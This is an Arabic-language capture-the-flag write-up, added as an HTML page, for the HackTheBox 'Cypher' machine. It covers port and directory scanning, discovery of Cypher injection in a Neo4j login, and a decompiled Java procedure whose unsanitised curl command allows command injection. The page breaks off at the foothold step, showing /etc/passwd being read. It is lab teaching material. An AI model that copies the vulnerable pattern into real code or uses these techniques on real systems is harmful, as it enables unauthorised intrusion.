@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html 
+  lang="en" 
+  dir="ltr">
+
+<head>
+  <link rel="icon" href="https://machiavelli.me/icons/favicon.ico" type="image/x-icon">
+  <link rel="shortcut icon" href="https://machiavelli.me/icons/favicon.ico" type="image/x-icon">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  
+  
+  <meta name="description" content="|_337 |-|4&gt;&lt;0R?" />
+  
+  
+
+  <title>
+    
+    HackTheBox | Cypher - عربي
+    
+</title>
+  <link rel="alternate" type="application/atom+xml" title="Machiavelli&#x27;s Homepage Atom Feed" href="https://machiavelli.me/atom.xml" />
+
+  
+  <link rel="stylesheet" href="https://machiavelli.me/site.css">
+  
+
+  
+  
+</head>
+
+<body class="hack dark main container">
+  
+    
+        
+  
+  <header class="nav-header">
+    <nav itemscope itemtype="http://schema.org/SiteNavigationElement" class="navbar">
+      <div class="nav-links">
+        
+        <a itemprop="url"
+          class=""
+          href="https://machiavelli.me">
+          <span itemprop="name">Home</span></a>
+        
+        <a itemprop="url"
+          class=""
+          href="https://machiavelli.me/rquotes">
+          <span itemprop="name">rquotes</span></a>
+        
+        <a itemprop="url"
+          class=""
+          href="https://machiavelli.me/lolbas">
+          <span itemprop="name">lolbas</span></a>
+        
+      </div>
+    </nav>
+    
+    <div class="search-container">
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" class="search-icon">
+        <path stroke-linecap="round" stroke-linejoin="round"
+          d="m21 21-5.197-5.197m0 0A7.5 7.5 0 1 0 5.196 5.196a7.5 7.5 0 0 0 10.607 10.607Z" />
+      </svg>
+      <input type="text" id="search" placeholder="Search...">
+      <div class="search-results">
+        <div class="search-results__items"></div>
+      </div>
+    </div>
+    
+
+  </header>
+  
+  
+    
+
+    <article itemscope itemtype="http://schema.org/BlogPosting">
+        <header style="text-align: right;">
+            <h1 itemprop="headline">HackTheBox | Cypher - عربي</h1>
+            <span class="muted">
+    <svg class="icon i-clock" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <circle cx="16" cy="16" r="14"/>
+        <path d="M16 8 L16 16 20 20"/>
+    </svg>
+    <span>3 minute read</span>
+    <svg class="icon i-edit" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z"/>
+    </svg>
+
+    Published: 2025-07-26
+</span>
+        </header>
+
+        
+        <nav aria-label="Table of contents" style="text-align: right;">
+            <details>
+                <summary role="button" style="padding: 0; margin: 1rem 0 1.5rem 0; text-align: right;">
+                    Table of Contents<br>
+                </summary>
+                <ul style="padding-right: 2rem; padding-left: 0; margin: 0; list-style: none; margin-bottom: 20px;">
+                    
+                    <li style="position: relative; padding-right: 25px; padding-left: 0;">
+                        <span style="position: absolute; right: 0; top: 0; width: 25px; text-align: right; font-family: monospace;">-</span>
+                        <a href="https://machiavelli.me/htb-cypher/#recon">Recon</a>
+                        
+                    </li>
+                    
+                    <li style="position: relative; padding-right: 25px; padding-left: 0;">
+                        <span style="position: absolute; right: 0; top: 0; width: 25px; text-align: right; font-family: monospace;">-</span>
+                        <a href="https://machiavelli.me/htb-cypher/#initial-foothold">Initial Foothold</a>
+                        
+                    </li>
+                    
+                    <li style="position: relative; padding-right: 25px; padding-left: 0;">
+                        <span style="position: absolute; right: 0; top: 0; width: 25px; text-align: right; font-family: monospace;">-</span>
+                        <a href="https://machiavelli.me/htb-cypher/#privilege-escalation">Privilege Escalation</a>
+                        
+                    </li>
+                    
+                    <li style="position: relative; padding-right: 25px; padding-left: 0;">
+                        <span style="position: absolute; right: 0; top: 0; width: 25px; text-align: right; font-family: monospace;">-</span>
+                        <a href="https://machiavelli.me/htb-cypher/#conclusion">Conclusion</a>
+                        
+                    </li>
+                    
+                </ul>
+            </details>
+        </nav>
+        
+
+        <div itemprop="articleBody" dir="rtl" style="text-align: right;">
+            <p>HackTheBox Cypher medium box write-up in Arabic - بالعربي.</p>
+<span id="continue-reading"></span><h2 id="recon">Recon</h2>
+<p>هنبدا بفحص المنافذ (Ports) باستخدام Nmap:</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;"># Nmap 7.94SVN scan initiated Sat Mar  1 14:57:42 2025 as: nmap -sS -p- -sC -sV -Pn --min-rate 1000 -oN mainTCPScan 10.10.11.57
+</span><span style="color:#abb2bf;">Warning: 10.10.11.57 giving up on port because retransmission cap hit (10).
+</span><span style="color:#abb2bf;">Nmap scan report for 10.10.11.57
+</span><span style="color:#abb2bf;">Host is up (0.26s latency).
+</span><span style="color:#abb2bf;">Not shown: 65533 closed tcp ports (reset)
+</span><span style="color:#abb2bf;">PORT   STATE SERVICE VERSION
+</span><span style="color:#abb2bf;">22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
+</span><span style="color:#abb2bf;">| ssh-hostkey: 
+</span><span style="color:#abb2bf;">|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
+</span><span style="color:#abb2bf;">|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
+</span><span style="color:#abb2bf;">80/tcp open  http    nginx 1.24.0 (Ubuntu)
+</span><span style="color:#abb2bf;">|_http-title: Did not follow redirect to http://cypher.htb/
+</span><span style="color:#abb2bf;">|_http-server-header: nginx/1.24.0 (Ubuntu)
+</span><span style="color:#abb2bf;">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span style="color:#abb2bf;"># Nmap done at Sat Mar  1 15:00:03 2025 -- 1 IP address (1 host up) scanned in 141.56 seconds
+</span></code></pre>
+<p>هنضيف <strong>cypher.htb</strong> في ملف <code>/etc/hosts</code> عندنا:</p>
+<p>لما فحصنا التطبيق اللي شغال على البورت 80، لقينا اسم التطبيق <strong>GRAPH ASM</strong>، وده يمكن يكون إشارة لينا (كنت فاكر انه GraphQL في البداية ولكن ملهوش اي علاقة بيه).</p>
+<div class="image-container" style="width: 100%; max-width: 600%; margin: 2.5rem auto; text-align: center;">
+    <img 
+      src="https:&#x2F;&#x2F;machiavelli.me&#x2F;htb-cypher&#x2F;assets/images/GraphASM.png" 
+      alt="graphasm" 
+      style="
+        max-width: 100%; 
+        height: auto; 
+        display: block; 
+        margin: 0 auto; 
+        border-radius: 8px; 
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.6);
+      "
+      loading="lazy"
+    >
+    
+  </div>
+<p>هنختبر خاصية تسجيل الدخول (Login) مع فحص VHosts والمجلدات (Directory Bruteforcing).</p>
+<div class="image-container" style="width: 100%; max-width: 600%; margin: 2.5rem auto; text-align: center;">
+    <img 
+      src="https:&#x2F;&#x2F;machiavelli.me&#x2F;htb-cypher&#x2F;assets/images/GraphASMLogin.png" 
+      alt="graphasm login" 
+      style="
+        max-width: 100%; 
+        height: auto; 
+        display: block; 
+        margin: 0 auto; 
+        border-radius: 8px; 
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.6);
+      "
+      loading="lazy"
+    >
+    
+  </div>
+<p>فحص <code>VHosts</code>:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">ffuf -u </span><span style="color:#9acc76;">&quot;http://cypher.htb/&quot;</span><span style="color:#eb6772;"> -H </span><span style="color:#9acc76;">&quot;Host: FUZZ.cypher.htb&quot;</span><span style="color:#eb6772;"> -c -w</span><span style="color:#abb2bf;"> /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt</span><span style="color:#eb6772;">  --fs</span><span style="color:#abb2bf;"> 154
+</span></code></pre>
+<p>الأمر بيستخدم أداة ffuf لفحص (subdomains) لـ cypher.htb بيستبدل كلمة FUZZ بقائمة من ملف seclists، وتصفية الردود بحجم 154 بايت (--fs 154) لأنها مبتكونش (subdomains) حقيقية False positive يعني.</p>
+<p>فحص المجلدات (Directories):</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">dirsearch -u </span><span style="color:#9acc76;">&quot;http://cypher.htb/&quot;</span><span style="color:#eb6772;"> --timeout</span><span style="color:#adb7c9;">=</span><span style="color:#abb2bf;">30
+</span></code></pre>
+<p>جربنا ندخل ببيانات زي <code>admin:admin</code> أو أي username و password مشهورين او Default لأنهم بيبقوا شغالين في بعض الأحيان, ومشغلين Burp Proxy في الخلفية.</p>
+<p>عادةً، أنا بحب أدخل Single quote <code>(')</code> أو Backslash <code>(\)</code> في اي Login، سواء في CTF أو Bug Bounty، ودي بتبقى مفيدة جدًا في اكتشاف ثغرات زي الSQL Injection.</p>
+<p>وجابت نتيجة في حالتنا:</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">HTTP/1.1 400 Bad Request
+</span><span style="color:#abb2bf;">Server: nginx/1.24.0 (Ubuntu)
+</span><span style="color:#abb2bf;">Date: Sun, 01 Mar 2025 20:28:00 GMT
+</span><span style="color:#abb2bf;">Content-Length: 3440
+</span><span style="color:#abb2bf;">Connection: keep-alive
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">Traceback (most recent call last):
+</span><span style="color:#abb2bf;">  File &quot;/app/app.py&quot;, line 142, in verify_creds
+</span><span style="color:#abb2bf;">    results = run_cypher(cypher)
+</span><span style="color:#abb2bf;">  File &quot;/app/app.py&quot;, line 63, in run_cypher
+</span><span style="color:#abb2bf;">    return [r.data() for r in session.run(cypher)]
+</span><span style="color:#abb2bf;">  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/session.py&quot;, line 314, in run
+</span><span style="color:#abb2bf;">    self._auto_result._run(
+</span><span style="color:#abb2bf;">  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py&quot;, line 221, in _run
+</span><span style="color:#abb2bf;">    self._attach()
+</span><span style="color:#abb2bf;">  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py&quot;, line 409, in _attach
+</span><span style="color:#abb2bf;">    self._connection.fetch_message()
+</span><span style="color:#abb2bf;">  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py&quot;, line 178, in inner
+</span><span style="color:#abb2bf;">    func(*args, **kwargs)
+</span><span style="color:#abb2bf;">  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py&quot;, line 860, in fetch_message
+</span><span style="color:#abb2bf;">    res = self._process_message(tag, fields)
+</span><span style="color:#abb2bf;">  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py&quot;, line 370, in _process_message
+</span><span style="color:#abb2bf;">    response.on_failure(summary_metadata or {})
+</span><span style="color:#abb2bf;">  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py&quot;, line 245, in on_failure
+</span><span style="color:#abb2bf;">    raise Neo4jError.hydrate(**metadata)
+</span><span style="color:#abb2bf;">neo4j.exceptions.CypherSyntaxError: {code: Neo.ClientError.Statement.SyntaxError} {message: Failed to parse string literal. The query must contain an even number of non-escaped quotes. (line 1, column 53 (offset: 52))
+</span><span style="color:#abb2bf;">&quot;MATCH (u:USER) -[:SECRET]-&gt; (h:SHA1) WHERE u.name = &#39;nice\&#39; return h.value as hash&quot;
+</span><span style="color:#abb2bf;">                                                     ^}
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">During handling of the above exception, another exception occurred:
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">Traceback (most recent call last):
+</span><span style="color:#abb2bf;">  File &quot;/app/app.py&quot;, line 165, in login
+</span><span style="color:#abb2bf;">    creds_valid = verify_creds(username, password)
+</span><span style="color:#abb2bf;">  File &quot;/app/app.py&quot;, line 151, in verify_creds
+</span><span style="color:#abb2bf;">    raise ValueError(f&quot;Invalid cypher query: {cypher}: {traceback.format_exc()}&quot;)
+</span><span style="color:#abb2bf;">ValueError: Invalid cypher query: MATCH (u:USER) -[:SECRET]-&gt; (h:SHA1) WHERE u.name = &#39;nice\&#39; return h.value as hash: Traceback (most recent call last):
+</span><span style="color:#abb2bf;">  File &quot;/app/app.py&quot;, line 142, in verify_creds
+</span><span style="color:#abb2bf;">    results = run_cypher(cypher)
+</span><span style="color:#abb2bf;">  File &quot;/app/app.py&quot;, line 63, in run_cypher
+</span><span style="color:#abb2bf;">    return [r.data() for r in session.run(cypher)]
+</span><span style="color:#abb2bf;">  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/session.py&quot;, line 314, in run
+</span><span style="color:#abb2bf;">    self._auto_result._run(
+</span><span style="color:#abb2bf;">  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py&quot;, line 221, in _run
+</span><span style="color:#abb2bf;">    self._attach()
+</span><span style="color:#abb2bf;">  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py&quot;, line 409, in _attach
+</span><span style="color:#abb2bf;">    self._connection.fetch_message()
+</span><span style="color:#abb2bf;">  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py&quot;, line 178, in inner
+</span><span style="color:#abb2bf;">    func(*args, **kwargs)
+</span><span style="color:#abb2bf;">  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py&quot;, line 860, in fetch_message
+</span><span style="color:#abb2bf;">    res = self._process_message(tag, fields)
+</span><span style="color:#abb2bf;">  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py&quot;, line 370, in _process_message
+</span><span style="color:#abb2bf;">    response.on_failure(summary_metadata or {})
+</span><span style="color:#abb2bf;">  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py&quot;, line 245, in on_failure
+</span><span style="color:#abb2bf;">    raise Neo4jError.hydrate(**metadata)
+</span><span style="color:#abb2bf;">neo4j.exceptions.CypherSyntaxError: {code: Neo.ClientError.Statement.SyntaxError} {message: Failed to parse string literal. The query must contain an even number of non-escaped quotes. (line 1, column 53 (offset: 52))
+</span><span style="color:#abb2bf;">&quot;MATCH (u:USER) -[:SECRET]-&gt; (h:SHA1) WHERE u.name = &#39;nice\&#39; return h.value as hash&quot;
+</span></code></pre>
+<p>بعد شوية بحث، اكتشفنا إن دي مش SQL Injection عادية، لكنها <strong>Cypher Injection</strong>، ودي زي SQL بس لقواعد بيانات الـ Graph زي Neo4j.</p>
+<p><a href="https://pentester.land/blog/cypher-injection-cheatsheet/">Cypher Injection CheatSheet</a></p>
+<p>لما رجعنا لنتايج الـ <strong>dirsearch</strong>:</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">[15:14:13] 200 -    5KB - /about                                            
+</span><span style="color:#abb2bf;">[15:15:51] 307 -    0B  - /api  -&gt;  /api/docs                               
+</span><span style="color:#abb2bf;">[15:15:51] 307 -    0B  - /api/  -&gt;  http://cypher.htb/api/api              
+</span><span style="color:#abb2bf;">[15:16:50] 307 -    0B  - /demo  -&gt;  /login                                 
+</span><span style="color:#abb2bf;">[15:16:50] 307 -    0B  - /demo/  -&gt;  http://cypher.htb/api/demo            
+</span><span style="color:#abb2bf;">[15:17:58] 200 -    4KB - /login                                            
+</span><span style="color:#abb2bf;">[15:17:59] 200 -    4KB - /login.html                                       
+</span><span style="color:#abb2bf;">[15:19:25] 301 -  178B  - /testing  -&gt;  http://cypher.htb/testing/          
+</span><span style="color:#abb2bf;">                                                                             
+</span><span style="color:#abb2bf;">Task Completed
+</span></code></pre>
+<p>المجلد <strong>testing</strong> شكله مهم، ولقينا ملف اسمه custom-apoc-extension-1.0-SNAPSHOT.jar`. عملناله decompilation باستخدام jd-gui ولقينا 2 classes:</p>
+<p><code>HelloWorldProcedure.class</code> - مش مهم.</p>
+<p><code>CustomFunctions.class</code> - مهم جدًا.</p>
+<p><strong>CustomFunctions.class:</strong></p>
+<pre data-lang="java" style="background-color:#2b303b;color:#6c7079;" class="language-java "><code class="language-java" data-lang="java"><span style="color:#abb2bf;">
+</span><span style="color:#cd74e8;">package </span><span style="color:#abb2bf;">com.cypher.neo4j.apoc;
+</span><span style="color:#abb2bf;">
+</span><span style="color:#cd74e8;">import </span><span style="color:#abb2bf;">java.io.</span><span style="color:#f0c678;">BufferedReader</span><span style="color:#abb2bf;">;
+</span><span style="color:#cd74e8;">import </span><span style="color:#abb2bf;">java.io.</span><span style="color:#f0c678;">InputStreamReader</span><span style="color:#abb2bf;">;
+</span><span style="color:#cd74e8;">import </span><span style="color:#abb2bf;">java.util.</span><span style="color:#f0c678;">Arrays</span><span style="color:#abb2bf;">;
+</span><span style="color:#cd74e8;">import </span><span style="color:#abb2bf;">java.util.concurrent.</span><span style="color:#f0c678;">TimeUnit</span><span style="color:#abb2bf;">;
+</span><span style="color:#cd74e8;">import </span><span style="color:#abb2bf;">java.util.stream.</span><span style="color:#f0c678;">Stream</span><span style="color:#abb2bf;">;
+</span><span style="color:#cd74e8;">import </span><span style="color:#abb2bf;">org.neo4j.procedure.</span><span style="color:#f0c678;">Description</span><span style="color:#abb2bf;">;
+</span><span style="color:#cd74e8;">import </span><span style="color:#abb2bf;">org.neo4j.procedure.</span><span style="color:#f0c678;">Mode</span><span style="color:#abb2bf;">;
+</span><span style="color:#cd74e8;">import </span><span style="color:#abb2bf;">org.neo4j.procedure.</span><span style="color:#f0c678;">Name</span><span style="color:#abb2bf;">;
+</span><span style="color:#cd74e8;">import </span><span style="color:#abb2bf;">org.neo4j.procedure.</span><span style="color:#f0c678;">Procedure</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">
+</span><span style="color:#cd74e8;">public class </span><span style="color:#f0c678;">CustomFunctions </span><span style="color:#adb7c9;">{
+</span><span style="color:#adb7c9;">  @</span><span style="color:#eb6772;">Procedure</span><span style="color:#adb7c9;">(</span><span style="color:#eb6772;">name </span><span style="color:#adb7c9;">= </span><span style="color:#9acc76;">&quot;custom.getUrlStatusCode&quot;</span><span style="color:#adb7c9;">, </span><span style="color:#eb6772;">mode </span><span style="color:#adb7c9;">= </span><span style="color:#f0c678;">Mode</span><span style="color:#adb7c9;">.</span><span style="color:#db9d63;">READ</span><span style="color:#adb7c9;">)
+</span><span style="color:#adb7c9;">  @</span><span style="color:#eb6772;">Description</span><span style="color:#adb7c9;">(</span><span style="color:#9acc76;">&quot;Returns the HTTP status code for the given URL as a string&quot;</span><span style="color:#adb7c9;">)
+</span><span style="color:#adb7c9;">  </span><span style="color:#cd74e8;">public </span><span style="color:#f0c678;">Stream</span><span style="color:#adb7c9;">&lt;</span><span style="color:#f0c678;">StringOutput</span><span style="color:#adb7c9;">&gt; </span><span style="color:#5cb3fa;">getUrlStatusCode</span><span style="color:#adb7c9;">(@</span><span style="color:#eb6772;">Name</span><span style="color:#adb7c9;">(</span><span style="color:#9acc76;">&quot;url&quot;</span><span style="color:#adb7c9;">) </span><span style="color:#f0c678;">String </span><span style="color:#eb6772;">url</span><span style="color:#adb7c9;">) </span><span style="color:#cd74e8;">throws </span><span style="color:#f0c678;">Exception </span><span style="color:#adb7c9;">{
+</span><span style="color:#adb7c9;">    </span><span style="color:#cd74e8;">if </span><span style="color:#adb7c9;">(!url.</span><span style="color:#eb6772;">toLowerCase</span><span style="color:#adb7c9;">().</span><span style="color:#eb6772;">startsWith</span><span style="color:#adb7c9;">(</span><span style="color:#9acc76;">&quot;http://&quot;</span><span style="color:#adb7c9;">) &amp;&amp; !url.</span><span style="color:#eb6772;">toLowerCase</span><span style="color:#adb7c9;">().</span><span style="color:#eb6772;">startsWith</span><span style="color:#adb7c9;">(</span><span style="color:#9acc76;">&quot;https://&quot;</span><span style="color:#adb7c9;">))
+</span><span style="color:#adb7c9;">      url = </span><span style="color:#9acc76;">&quot;https://&quot; </span><span style="color:#adb7c9;">+ url; 
+</span><span style="color:#adb7c9;">    </span><span style="color:#f0c678;">String</span><span style="color:#cd74e8;">[]</span><span style="color:#adb7c9;"> command = { </span><span style="color:#9acc76;">&quot;/bin/sh&quot;</span><span style="color:#adb7c9;">, </span><span style="color:#9acc76;">&quot;-c&quot;</span><span style="color:#adb7c9;">, </span><span style="color:#9acc76;">&quot;curl -s -o /dev/null --connect-timeout 1 -w %{http_code} &quot; </span><span style="color:#adb7c9;">+ url };
+</span><span style="color:#adb7c9;">    </span><span style="color:#f0c678;">System</span><span style="color:#adb7c9;">.out.</span><span style="color:#eb6772;">println</span><span style="color:#adb7c9;">(</span><span style="color:#9acc76;">&quot;Command: &quot; </span><span style="color:#adb7c9;">+ </span><span style="color:#f0c678;">Arrays</span><span style="color:#adb7c9;">.</span><span style="color:#eb6772;">toString</span><span style="color:#adb7c9;">((</span><span style="color:#f0c678;">Object</span><span style="color:#cd74e8;">[]</span><span style="color:#adb7c9;">)command));
+</span><span style="color:#adb7c9;">    </span><span style="color:#f0c678;">Process</span><span style="color:#adb7c9;"> process = </span><span style="color:#f0c678;">Runtime</span><span style="color:#adb7c9;">.</span><span style="color:#eb6772;">getRuntime</span><span style="color:#adb7c9;">().</span><span style="color:#eb6772;">exec</span><span style="color:#adb7c9;">(command);
+</span><span style="color:#adb7c9;">    </span><span style="color:#f0c678;">BufferedReader</span><span style="color:#adb7c9;"> inputReader = </span><span style="color:#cd74e8;">new </span><span style="color:#f0c678;">BufferedReader</span><span style="color:#adb7c9;">(</span><span style="color:#cd74e8;">new </span><span style="color:#f0c678;">InputStreamReader</span><span style="color:#adb7c9;">(process.</span><span style="color:#eb6772;">getInputStream</span><span style="color:#adb7c9;">()));
+</span><span style="color:#adb7c9;">    </span><span style="color:#f0c678;">BufferedReader</span><span style="color:#adb7c9;"> errorReader = </span><span style="color:#cd74e8;">new </span><span style="color:#f0c678;">BufferedReader</span><span style="color:#adb7c9;">(</span><span style="color:#cd74e8;">new </span><span style="color:#f0c678;">InputStreamReader</span><span style="color:#adb7c9;">(process.</span><span style="color:#eb6772;">getErrorStream</span><span style="color:#adb7c9;">()));
+</span><span style="color:#adb7c9;">    </span><span style="color:#f0c678;">StringBuilder</span><span style="color:#adb7c9;"> errorOutput = </span><span style="color:#cd74e8;">new </span><span style="color:#f0c678;">StringBuilder</span><span style="color:#adb7c9;">();
+</span><span style="color:#adb7c9;">    </span><span style="color:#f0c678;">String</span><span style="color:#adb7c9;"> line;
+</span><span style="color:#adb7c9;">    </span><span style="color:#cd74e8;">while </span><span style="color:#adb7c9;">((line = errorReader.</span><span style="color:#eb6772;">readLine</span><span style="color:#adb7c9;">()) != </span><span style="color:#db9d63;">null</span><span style="color:#adb7c9;">)
+</span><span style="color:#adb7c9;">      errorOutput.</span><span style="color:#eb6772;">append</span><span style="color:#adb7c9;">(line).</span><span style="color:#eb6772;">append</span><span style="color:#adb7c9;">(</span><span style="color:#9acc76;">&quot;</span><span style="color:#5ebfcc;">\n</span><span style="color:#9acc76;">&quot;</span><span style="color:#adb7c9;">); 
+</span><span style="color:#adb7c9;">    </span><span style="color:#f0c678;">String</span><span style="color:#adb7c9;"> statusCode = inputReader.</span><span style="color:#eb6772;">readLine</span><span style="color:#adb7c9;">();
+</span><span style="color:#adb7c9;">    </span><span style="color:#f0c678;">System</span><span style="color:#adb7c9;">.out.</span><span style="color:#eb6772;">println</span><span style="color:#adb7c9;">(</span><span style="color:#9acc76;">&quot;Status code: &quot; </span><span style="color:#adb7c9;">+ statusCode);
+</span><span style="color:#adb7c9;">    </span><span style="color:#cd74e8;">boolean</span><span style="color:#adb7c9;"> exited = process.</span><span style="color:#eb6772;">waitFor</span><span style="color:#adb7c9;">(</span><span style="color:#db9d63;">10</span><span style="color:#cd74e8;">L</span><span style="color:#adb7c9;">, </span><span style="color:#f0c678;">TimeUnit</span><span style="color:#adb7c9;">.</span><span style="color:#db9d63;">SECONDS</span><span style="color:#adb7c9;">);
+</span><span style="color:#adb7c9;">    </span><span style="color:#cd74e8;">if </span><span style="color:#adb7c9;">(!exited) {
+</span><span style="color:#adb7c9;">      process.</span><span style="color:#eb6772;">destroyForcibly</span><span style="color:#adb7c9;">();
+</span><span style="color:#adb7c9;">      statusCode = </span><span style="color:#9acc76;">&quot;0&quot;</span><span style="color:#adb7c9;">;
+</span><span style="color:#adb7c9;">      </span><span style="color:#f0c678;">System</span><span style="color:#adb7c9;">.err.</span><span style="color:#eb6772;">println</span><span style="color:#adb7c9;">(</span><span style="color:#9acc76;">&quot;Process timed out after 10 seconds&quot;</span><span style="color:#adb7c9;">);
+</span><span style="color:#adb7c9;">    } </span><span style="color:#cd74e8;">else </span><span style="color:#adb7c9;">{
+</span><span style="color:#adb7c9;">      </span><span style="color:#cd74e8;">int</span><span style="color:#adb7c9;"> exitCode = process.</span><span style="color:#eb6772;">exitValue</span><span style="color:#adb7c9;">();
+</span><span style="color:#adb7c9;">      </span><span style="color:#cd74e8;">if </span><span style="color:#adb7c9;">(exitCode != </span><span style="color:#db9d63;">0</span><span style="color:#adb7c9;">) {
+</span><span style="color:#adb7c9;">        statusCode = </span><span style="color:#9acc76;">&quot;0&quot;</span><span style="color:#adb7c9;">;
+</span><span style="color:#adb7c9;">        </span><span style="color:#f0c678;">System</span><span style="color:#adb7c9;">.err.</span><span style="color:#eb6772;">println</span><span style="color:#adb7c9;">(</span><span style="color:#9acc76;">&quot;Process exited with code &quot; </span><span style="color:#adb7c9;">+ exitCode);
+</span><span style="color:#adb7c9;">      } 
+</span><span style="color:#adb7c9;">    } 
+</span><span style="color:#adb7c9;">    </span><span style="color:#cd74e8;">if </span><span style="color:#adb7c9;">(errorOutput.</span><span style="color:#eb6772;">length</span><span style="color:#adb7c9;">() &gt; </span><span style="color:#db9d63;">0</span><span style="color:#adb7c9;">)
+</span><span style="color:#adb7c9;">      </span><span style="color:#f0c678;">System</span><span style="color:#adb7c9;">.err.</span><span style="color:#eb6772;">println</span><span style="color:#adb7c9;">(</span><span style="color:#9acc76;">&quot;Error output:</span><span style="color:#5ebfcc;">\n</span><span style="color:#9acc76;">&quot; </span><span style="color:#adb7c9;">+ errorOutput.</span><span style="color:#eb6772;">toString</span><span style="color:#adb7c9;">()); 
+</span><span style="color:#adb7c9;">    </span><span style="color:#cd74e8;">return </span><span style="color:#f0c678;">Stream</span><span style="color:#adb7c9;">.</span><span style="color:#eb6772;">of</span><span style="color:#adb7c9;">(</span><span style="color:#cd74e8;">new </span><span style="color:#f0c678;">StringOutput</span><span style="color:#adb7c9;">(statusCode));
+</span><span style="color:#adb7c9;">  }
+</span><span style="color:#adb7c9;">  
+</span><span style="color:#adb7c9;">  </span><span style="color:#cd74e8;">public static class </span><span style="color:#f0c678;">StringOutput </span><span style="color:#adb7c9;">{
+</span><span style="color:#adb7c9;">    </span><span style="color:#cd74e8;">public </span><span style="color:#f0c678;">String </span><span style="color:#adb7c9;">statusCode;
+</span><span style="color:#adb7c9;">    
+</span><span style="color:#adb7c9;">    </span><span style="color:#cd74e8;">public </span><span style="color:#5cb3fa;">StringOutput</span><span style="color:#adb7c9;">(</span><span style="color:#f0c678;">String </span><span style="color:#eb6772;">statusCode</span><span style="color:#adb7c9;">) {
+</span><span style="color:#adb7c9;">      </span><span style="color:#eb6772;">this</span><span style="color:#adb7c9;">.statusCode = statusCode;
+</span><span style="color:#adb7c9;">    }
+</span><span style="color:#adb7c9;">  }
+</span><span style="color:#adb7c9;">}
+</span></code></pre>
+<p>الclass الي اسمه <code>CustomFunctions</code> ده Procedure لـ Neo4j بيجيب الStatus code HTTP لـ URL معين عن طريق curl. لكن المشكلة إنه فيه ثغرة Command Injection خطيرة بسبب إن الإدخال مش متأمّن، وهنستغلها عن طريق Cypher Injection.</p>
+<p>الكود المصاب:</p>
+<pre data-lang="java" style="background-color:#2b303b;color:#6c7079;" class="language-java "><code class="language-java" data-lang="java"><span style="color:#abb2bf;">
+</span><span style="color:#f0c678;">String</span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;"> command </span><span style="color:#adb7c9;">= </span><span style="color:#abb2bf;">{ </span><span style="color:#9acc76;">&quot;/bin/sh&quot;</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&quot;-c&quot;</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&quot;curl -s -o /dev/null --connect-timeout 1 -w %{http_code} &quot; </span><span style="color:#adb7c9;">+</span><span style="color:#abb2bf;"> url };
+</span></code></pre>
+<h2 id="initial-foothold">Initial Foothold</h2>
+<p>كتبنا payload لـ Cypher Injection باستخدام الprocedure اللي لقيناه عشان ننفذ أوامر (Remote Code Execution).</p>
+<div class="image-container" style="width: 100%; max-width: 600%; margin: 2.5rem auto; text-align: center;">
+    <img 
+      src="https:&#x2F;&#x2F;machiavelli.me&#x2F;htb-cypher&#x2F;assets/images/CypheretcPasswd.png" 
+      alt="cypher etcpasswd" 
+      style="
